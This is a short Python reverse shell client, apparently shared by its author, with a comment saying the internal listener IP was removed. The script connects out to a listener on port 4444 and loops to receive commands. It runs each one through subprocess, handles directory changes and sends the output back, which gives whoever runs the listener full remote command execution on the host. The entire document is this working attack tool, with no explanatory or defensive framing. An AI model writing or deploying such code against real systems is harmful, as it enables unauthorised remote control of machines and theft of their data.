import socket
import subprocess
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("", 4444)) # I removed the ip, not that it would matter a whole lot since it was internal

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    elif command.startswith("cd "):
        try:
            os.chdir(command[3:])
            output = os.getcwd()
        except Exception as e:
            output = str(e)
    else:
        output = subprocess.getoutput(command)

    client.send(output.encode())

client.close()
